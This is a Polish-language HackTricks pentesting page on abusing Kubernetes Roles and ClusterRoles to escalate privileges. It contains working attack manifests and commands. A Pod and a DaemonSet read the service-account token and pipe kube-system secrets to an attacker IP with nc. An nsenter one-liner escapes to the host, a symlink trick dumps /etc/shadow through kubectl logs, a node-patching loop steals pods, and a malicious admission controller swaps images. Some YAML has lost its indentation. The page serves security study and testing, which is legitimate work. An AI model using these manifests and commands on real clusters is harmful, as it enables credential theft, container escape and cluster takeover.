# Abusing Roles/ClusterRoles in Kubernetes

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów GitHub.**

</details>

Tutaj znajdziesz niektóre potencjalnie niebezpieczne konfiguracje ról i ClusterRoles.\
Pamiętaj, że możesz uzyskać wszystkie obsługiwane zasoby za pomocą `kubectl api-resources`

## **Eskalacja uprawnień**

Mówiąc o zdolności **uzyskania dostępu do innego podmiotu** w klastrze **z innymi uprawnieniami** (wewnątrz klastra Kubernetes lub do zewnętrznych chmur), w Kubernetes istnieją głównie **4 główne techniki eskalacji uprawnień**:

* Możliwość **udawania** innego użytkownika/grupy/SA z lepszymi uprawnieniami w klastrze Kubernetes lub do zewnętrznych chmur
* Możliwość **tworzenia/aktualizacji/wykonania podów**, w których można **znaleźć lub dołączyć SA** z lepszymi uprawnieniami w klastrze Kubernetes lub do zewnętrznych chmur
* Możliwość **odczytu tajemnic**, ponieważ tokeny SA są przechowywane jako tajemnice
* Możliwość **ucieczki do węzła** z kontenera, gdzie można ukraść wszystkie tajemnice działających węzłów, poświadczenia węzła i uprawnienia węzła w chmurze, w której działa (jeśli istnieją)
* Piąta technika, która zasługuje na uwagę, to możliwość **uruchomienia port-forward** w podzie, ponieważ można uzyskać dostęp do interesujących zasobów w tym podzie.

### Dostęp do dowolnego zasobu lub czasownika (Wildcard)

**Znak wieloznaczny (\*) daje uprawnienia do dowolnego zasobu z dowolnym czasownikiem**. Jest używany przez administratorów. Wewnątrz ClusterRole oznacza to, że atakujący może nadużywać dowolnego namespace w klastrze.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```

### Uzyskaj dostęp do dowolnego zasobu za pomocą określonego czasownika

W RBAC pewne uprawnienia stwarzają znaczne ryzyko:

1. **`create`:** Udziela możliwości tworzenia dowolnego zasobu klastra, zwiększając ryzyko eskalacji uprawnień.
2. **`list`:** Pozwala na wyświetlanie wszystkich zasobów, potencjalnie ujawniając wrażliwe dane.
3. **`get`:** Umożliwia dostęp do sekretów z kont usługowych, stanowiąc zagrożenie dla bezpieczeństwa.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```

### Tworzenie Pod - Kradzież Tokena

Atakujący posiadający uprawnienia do tworzenia poda może dołączyć uprzywilejowane konto usługi do poda i ukraść token, aby podszywać się pod to konto usługi. Efektywnie podnosi to uprawnienia do tego konta.

Przykład poda, który ukraść token konta usługi `bootstrap-signer` i wysłać go do atakującego:

```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```

### Tworzenie i ucieczka z kontenera

Poniżej przedstawiono wszystkie uprawnienia, jakie może mieć kontener:

* **Dostęp z uprawnieniami** (wyłączanie zabezpieczeń i ustawianie możliwości)
* **Wyłączanie przestrzeni nazw hostIPC i hostPid**, które mogą pomóc w eskalacji uprawnień
* **Wyłączanie przestrzeni nazw hostNetwork**, umożliwiające kradzież uprawnień chmury węzłów i lepszy dostęp do sieci
* **Montowanie / hosta wewnątrz kontenera**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Utwórz pod za pomocą:

```bash
kubectl --token $token create -f mount_root.yaml
```

Jednolinijkowiec z [tego tweeta](https://twitter.com/mauilion/status/1129468485480751104) z kilkoma dodatkami:

```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Teraz, gdy możesz uciec do węzła, sprawdź techniki post-eksploatacyjne w:

#### Stealth

Prawdopodobnie chcesz być bardziej **niezauważalny**, na następnych stronach możesz zobaczyć, do czego będziesz mógł uzyskać dostęp, jeśli utworzysz pod, włączając tylko niektóre z wymienionych uprawnień w poprzednim szablonie:

* **Privileged + hostPID**
* **Tylko privileged**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Przykłady konfiguracji uprzywilejowanych podów można znaleźć w_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Tworzenie podów - Przejdź do chmury

Jeśli możesz **utworzyć** pod (i opcjonalnie konto **service account**), możesz być w stanie **uzyskać uprawnienia w środowisku chmury**, przypisując role chmury do poda lub konta service account, a następnie uzyskać do niego dostęp.\
Ponadto, jeśli możesz utworzyć **pod z przestrzenią nazw sieci hosta**, możesz **ukraść rolę IAM** instancji **węzła**.

Aby uzyskać więcej informacji, sprawdź:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Tworzenie/Patchowanie Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs i Cronjobs**

Można wykorzystać te uprawnienia do **utworzenia nowego poda** i uzyskania uprawnień, jak w poprzednim przykładzie.

Poniższy plik yaml **tworzy daemonset i wycieka token SA** do środka poda:

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```

### **Wykonanie poleceń w kontenerach**

**`pods/exec`** to zasób w Kubernetes, który służy do **wykonywania poleceń w powłoce wewnątrz kontenera**. Pozwala to na **wykonywanie poleceń wewnątrz kontenerów lub uzyskanie dostępu do powłoki**.

Dlatego możliwe jest **wejście do kontenera i kradzież tokena SA**, lub wejście do uprzywilejowanego kontenera, ucieczka do węzła i kradzież wszystkich tokenów kontenerów na węźle oraz (nadużywanie) węzła:

```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```

### port-forward

To uprawnienie umożliwia **przekierowanie jednego lokalnego portu na jeden port w określonym podzie**. Ma to na celu umożliwienie łatwego debugowania aplikacji działających wewnątrz poda, ale atakujący może je wykorzystać do uzyskania dostępu do interesujących (np. baz danych) lub podatnych aplikacji (np. strony internetowe) wewnątrz poda:

```
kubectl port-forward pod/mypod 5000:5000
```

### Ucieczka z folderu /var/log/ z możliwością zapisu

Jak [**wskazano w tej analizie**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), jeśli masz dostęp lub możesz utworzyć pod z zamontowanym katalogiem **`/var/log/` z hosta**, możesz **uciec z kontenera**.\
Dzieje się tak, ponieważ, gdy **Kube-API próbuje pobrać logi** kontenera (używając `kubectl logs <pod>`), żąda pliku `0.log` poda za pomocą punktu końcowego `/logs/` usługi **Kubelet**.\
Usługa Kubelet udostępnia punkt końcowy `/logs/`, który w zasadzie **eksponuje system plików `/var/log` kontenera**.

Dlatego atakujący mający **dostęp do zapisu w folderze /var/log/** kontenera może wykorzystać to zachowanie na 2 sposoby:

* Modyfikując plik `0.log` swojego kontenera (zwykle znajdujący się w `/var/logs/pods/namespace_pod_uid/container/0.log`) tak, aby był **symlinkiem wskazującym na `/etc/shadow`** na przykład. Następnie będziesz mógł wydobyć plik shadow hosta wykonując:

```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```

* Jeśli atakujący kontroluje jakiekolwiek podmioty z uprawnieniami do odczytu `nodes/log`, może po prostu utworzyć **symlink** w `/host-mounted/var/log/sym` do `/`, a następnie podczas **dostępu do `https://<gateway>:10250/logs/sym/` wyświetli zawartość głównego systemu plików hosta** (zmiana symlinka może umożliwić dostęp do plików).

```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```

**Laboratorium i automatyczny exploit można znaleźć na** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Omijanie ochrony tylko do odczytu dla hostpath <a href="#omijanie-ochrony-tylko-do-odczytu-dla-hostpath" id="omijanie-ochrony-tylko-do-odczytu-dla-hostpath"></a>

Jeśli masz szczęście i masz dostęp do wysoko uprzywilejowanej możliwości `CAP_SYS_ADMIN`, możesz po prostu ponownie zamontować folder jako rw:

```bash
mount -o rw,remount /hostlogs/
```

#### Omijanie ochrony hostPath readOnly <a href="#omijanie-ochrony-hostpath-readonly" id="omijanie-ochrony-hostpath-readonly"></a>

Jak stwierdzono w [**tej analizie**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), możliwe jest obejście ochrony:

```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```

To miało zapobiec ucieczkom podobnym do poprzednich, poprzez zamiast korzystania z montażu hostPath, używać PersistentVolume i PersistentVolumeClaim do zamontowania folderu hosta w kontenerze z dostępem do zapisu:

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```

### **Podszywanie się pod uprzywilejowane konta**

Z uprawnieniami do [**podrobienia użytkownika**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), atakujący może podszyć się pod uprzywilejowane konto.

Wystarczy użyć parametru `--as=<nazwa_użytkownika>` w poleceniu `kubectl`, aby podszyć się pod użytkownika, lub `--as-group=<grupa>` aby podszyć się pod grupę:

```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```

Lub użyj interfejsu REST API:

```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### Wyświetlanie sekretów

Uprawnienie do **wyświetlania sekretów może umożliwić atakującemu faktyczne odczytanie sekretów** poprzez dostęp do punktu końcowego interfejsu API REST:

```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### Odczytywanie tajemnicy - łamanie tokenów ID metodą brute-force

Podczas gdy atakujący posiadający token z uprawnieniami do odczytu wymaga dokładnej nazwy tajemnicy, aby jej użyć, w przeciwieństwie do bardziej ogólnych uprawnień _**listowania tajemnic**_, istnieją nadal podatności. Domyślne konta usług w systemie mogą być wyliczane, związane z każdą tajemnicą. Te tajemnice mają strukturę nazwy: stały prefiks, a następnie losowy pięciocyfrowy alfanumeryczny token (z wyłączeniem pewnych znaków) zgodnie z [kodem źródłowym](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Token jest generowany z ograniczonego zestawu 27 znaków (`bcdfghjklmnpqrstvwxz2456789`), a nie z pełnego zakresu alfanumerycznego. To ograniczenie zmniejsza całkowitą liczbę możliwych kombinacji do 14 348 907 (27^5). W rezultacie atakujący mógłby wykonać atak brute-force w celu odgadnięcia tokenu w ciągu kilku godzin, co potencjalnie prowadziłoby do eskalacji uprawnień poprzez uzyskanie dostępu do wrażliwych kont usługowych.

### Żądania podpisywania certyfikatów

Jeśli masz czasowniki **`create`** w zasobie `certificatesigningrequests` (lub przynajmniej w `certificatesigningrequests/nodeClient`), możesz **utworzyć** nowe żądanie podpisania certyfikatu dla **nowego węzła**.

Zgodnie z [dokumentacją, możliwe jest automatyczne zatwierdzanie tych żądań](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), więc w tym przypadku **nie potrzebujesz dodatkowych uprawnień**. Jeśli nie, musisz mieć możliwość zatwierdzenia żądania, co oznacza aktualizację w `certificatesigningrequests/approval` i `approve` w `signers` z resourceName `<signerNameDomain>/<signerNamePath>` lub `<signerNameDomain>/*`.

**Przykład roli** z wszystkimi wymaganymi uprawnieniami to:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```

Więc, po zatwierdzeniu nowego CSR węzła, można **nadużyć** specjalnych uprawnień węzłów do **kradzieży sekretów** i **eskalacji uprawnień**.

W [**tym poście**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) i [**tym**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) konfiguracja GKE K8s TLS Bootstrap jest skonfigurowana z **automatycznym podpisywaniem** i jest nadużywana do generowania poświadczeń nowego węzła K8s, a następnie nadużywana do eskalacji uprawnień poprzez kradzież sekretów.\
Jeśli **masz wspomniane uprawnienia, możesz zrobić to samo**. Należy zauważyć, że pierwszy przykład omija błąd uniemożliwiający nowemu węzłowi dostęp do sekretów wewnątrz kontenerów, ponieważ **węzeł może uzyskać dostęp tylko do sekretów kontenerów zamontowanych na nim**.

Sposób na obejście tego polega po prostu na **utworzeniu poświadczeń węzła dla nazwy węzła, na którym zamontowany jest kontener z interesującymi sekretami** (ale sprawdź, jak to zrobić w pierwszym poście):

```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```

### AWS EKS aws-auth configmaps

Podmioty, które mogą modyfikować **`configmaps`** w przestrzeni nazw kube-system na klastrach EKS (muszą znajdować się w AWS), mogą uzyskać uprawnienia administratora klastra, nadpisując configmapę **aws-auth**.\
Potrzebne są czasowniki **`update`** i **`patch`**, lub **`create`** jeśli configmapa nie została jeszcze utworzona:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Możesz użyć **`aws-auth`** do **trwałego** dostępu dla użytkowników z **innych kont**.

Jednak `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **nie działa z innego konta**. Ale tak naprawdę `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` działa, jeśli podasz ARN klastra zamiast samej nazwy.\
Aby `kubectl` działał, upewnij się, że **skonfigurujesz** **kubeconfig ofiary** i w argumentach aws exec dodaj `--profile other_account_role`, aby kubectl używał profilu innego konta do pobrania tokena i skontaktowania się z AWS.
{% endhint %}

### Eskalacja w GKE

Istnieją **2 sposoby przypisywania uprawnień K8s do podmiotów GCP**. W każdym przypadku podmiot musi mieć również uprawnienie **`container.clusters.get`**, aby móc uzyskać poświadczenia dostępu do klastra, lub będziesz musiał **wygenerować własny plik konfiguracyjny kubectl** (postępuj zgodnie z następnym linkiem).

{% hint style="warning" %}
Podczas rozmowy z punktem końcowym API K8s zostanie wysłany **token uwierzytelniający GCP**. Następnie GCP, za pośrednictwem punktu końcowego API K8s, najpierw **sprawdzi, czy podmiot** (na podstawie adresu e-mail) **ma dostęp do klastra**, a następnie sprawdzi, czy ma **dostęp za pośrednictwem GCP IAM**.\
Jeśli **którekolwiek** z tych warunków jest **prawdziwe**, zostanie udzielona odpowiedź. Jeśli **nie**, zostanie wyświetlony błąd sugerujący udzielenie **uprawnień za pośrednictwem GCP IAM**.
{% endhint %}

Pierwsza metoda polega na użyciu **GCP IAM**, uprawnienia K8s mają swoje **odpowiednie uprawnienia GCP IAM**, i jeśli podmiot je posiada, będzie mógł z nich skorzystać.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Druga metoda polega na **przypisaniu uprawnień K8s wewnątrz klastra** do identyfikacji użytkownika na podstawie jego **adresu e-mail** (w tym konta usług GCP).

### Tworzenie tokenów dla kont usługowych

Podmioty, które mogą **tworzyć żądania tokenów** (`serviceaccounts/token`) podczas rozmowy z punktem końcowym API K8s SAs (informacje z [**tutaj**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Podmioty, które mogą **`aktualizować`** lub **`modyfikować`** **`pods/ephemeralcontainers`**, mogą uzyskać **wykonanie kodu na innych podach** i potencjalnie **przejść** do swojego węzła, dodając tymczasowy kontener z uprzywilejowanym securityContext.

### ValidatingWebhookConfigurations lub MutatingWebhookConfigurations

Podmioty posiadające dowolne z czasowników `create`, `update` lub `patch` nad `validatingwebhookconfigurations` lub `mutatingwebhookconfigurations` mogą być w stanie **utworzyć jedną z takich webhookconfigurations**, aby móc **eskalować uprawnienia**.

Przykład [`mutatingwebhookconfigurations znajdziesz w tej sekcji tego posta`](./#malicious-admission-controller).

### Eskalacja

Jak możesz przeczytać w następnej sekcji: [**Wbudowana zapobieganie eskalacji uprawnień**](./#built-in-privileged-escalation-prevention), podmiot nie może aktualizować ani tworzyć ról ani clusterroles bez posiadania tych nowych uprawnień. Chyba że ma czasownik `escalate` nad `roles` lub `clusterroles`.\
Wtedy może aktualizować/tworzyć nowe role, clusterroles z lepszymi uprawnieniami niż te, które posiada.

### Proxy węzłów

Podmioty z dostępem do podzasobu **`nodes/proxy`** mogą **wykonywać kod na podach** za pośrednictwem interfejsu API Kubelet (zgodnie z [**tym**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Więcej informacji na temat uwierzytelniania Kubelet znajdziesz na tej stronie:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Przykład, jak uzyskać [**RCE rozmawiając z autoryzacją z interfejsem API Kubelet, znajdziesz tutaj**](../pentesting-kubernetes-services/#kubelet-rce).

### Usuwanie podów + węzły niedopuszczalne

Podmioty, które mogą **usuwać pody** (czasownik `delete` nad zasobem `pods`), lub **wysuwać pody** (czasownik `create` nad zasobem `pods/eviction`), lub **zmieniać status poda** (dostęp do `pods/status`) i mogą **uniemożliwić planowanie innych węzłów** (dostęp do `nodes/status`) lub **usuwać węzły** (czasownik `delete` nad zasobem `nodes`) i mają kontrolę nad podem, mogą **ukraść pody z innych węzłów**, aby były **wykonywane** na **skompromitowanym** **węźle**, a atakujący może **ukraść tokeny** z tych podów.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Status usług (CVE-2020-8554)

Podmioty, które mogą **modyfikować** **`services/status`**, mogą ustawić pole `status.loadBalancer.ingress.ip` w celu wykorzystania **niezałatanej luki CVE-2020-8554** i przeprowadzenia ataków **MiTM na klaster**. Większość łagodzeń dla CVE-2020-8554 dotyczy tylko usług ExternalIP (zgodnie z [**tym**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Status węzłów i podów

Podmioty posiadające uprawnienia **`update`** lub **`patch`** do `nodes/status` lub `pods/status` mogą modyfikować etykiety w celu wpływania na narzucone ograniczenia planowania.

## Wbudowana zapobieganie eskalacji uprawnień

Kubernetes posiada [wbudowany mechanizm](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping), który zapobiega eskalacji uprawnień.

Ten system zapewnia, że **użytkownicy nie mogą podnosić swoich uprawnień poprzez modyfikację ról lub powiązań ról**. Egzekwowanie tej reguły odbywa się na poziomie interfejsu API, zapewniając zabezpieczenie nawet wtedy, gdy autoryzator RBAC jest nieaktywny.

Reguła określa, że **użytkownik może tworzyć lub aktualizować rolę tylko wtedy, gdy posiada wszystkie uprawnienia, z których składa się rola**. Ponadto, zakres istniejących uprawnień użytkownika musi być zgodny z zakresem roli, którą próbuje utworzyć lub zmodyfikować: albo ogólnoklastrowy dla ClusterRoles, albo ograniczony do tej samej przestrzeni nazw (lub ogólnoklastrowy) dla Roles.

{% hint style="warning" %}
Istnieje wyjątek od poprzedniej reguły. Jeśli podmiot ma **czasownik `escalate`** dla **`roles`** lub **`clusterroles`**, może zwiększyć uprawnienia ról i clusterroles nawet bez posiadania tych uprawnień.
{% endhint %}

### **Pobierz i zmień RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Wcześniej ta technika działała, ale według moich testów już nie działa z tego samego powodu, co wyjaśniono w poprzedniej sekcji. Nie możesz tworzyć/modyfikować rolebinding, aby nadać sobie lub innemu SA pewne uprawnienia, jeśli ich nie masz już.**
{% endhint %}

Uprawnienie do tworzenia Rolebindings umożliwia użytkownikowi **powiązanie ról z kontem usługi**. To uprawnienie może potencjalnie prowadzić do eskalacji uprawnień, ponieważ **umożliwia użytkownikowi powiązanie uprawnień administratora z skompromitowanym kontem usługi.**

## Inne ataki

### Aplikacja proxy sidecar

Domyślnie nie ma żadnego szyfrowania w komunikacji między podami. Autoryzacja wzajemna, dwukierunkowa, pod do podu.

#### Utwórz aplikację proxy sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Utwórz plik .yaml

```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```

Edytuj swój plik .yaml i dodaj odkomentowane linie:

```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```

Zobacz dzienniki proxy:

```bash
kubectl logs app -C proxy
```

Więcej informacji na: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Złośliwy kontroler przyjęcia

Kontroler przyjęcia **przechwytuje żądania do serwera API Kubernetes** przed trwałością obiektu, ale **po uwierzytelnieniu** **i autoryzacji** żądania.

Jeśli atakujący w jakiś sposób zdoła **wstrzyknąć kontroler przyjęcia mutacji**, będzie mógł **modyfikować już uwierzytelnione żądania**. To pozwala na potencjalne podniesienie uprawnień i zazwyczaj na trwałe pozostanie w klastrze.

**Przykład z** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):

```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```

Sprawdź status, aby zobaczyć, czy jest gotowy:

```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```

![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Następnie wdroż nowy pod:

```bash
kubectl run nginx --image nginx
kubectl get po -w
```

Kiedy widzisz błąd `ErrImagePull`, sprawdź nazwę obrazu za pomocą jednego z poniższych zapytań:

```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```

![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Jak można zobaczyć na powyższym obrazku, próbowaliśmy uruchomić obraz `nginx`, ale ostatecznie wykonany został obraz `rewanthtammana/malicious-image`. Co się właśnie stało!!?

#### Techniczne szczegóły <a href="#heading-technicalities" id="heading-technicalities"></a>

Skrypt `./deploy.sh` ustanawia kontroler przyjęcia webhooka mutującego, który modyfikuje żądania do interfejsu API Kubernetes zgodnie z określonymi w jego konfiguracji liniami, wpływając na obserwowane wyniki:

```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```

Powyższy fragment zastępuje pierwszy obraz kontenera w każdym podzie przez `rewanthtammana/malicious-image`.

## Najlepsze praktyki

### **Wyłączanie automatycznego montowania tokenów konta usługi**

* **Pody i konta usługi**: Domyślnie pody montują token konta usługi. Aby zwiększyć bezpieczeństwo, Kubernetes umożliwia wyłączenie tej funkcji automatycznego montowania.
* **Jak zastosować**: Ustaw `automountServiceAccountToken: false` w konfiguracji kont usługi lub podów, zaczynając od wersji Kubernetes 1.6.

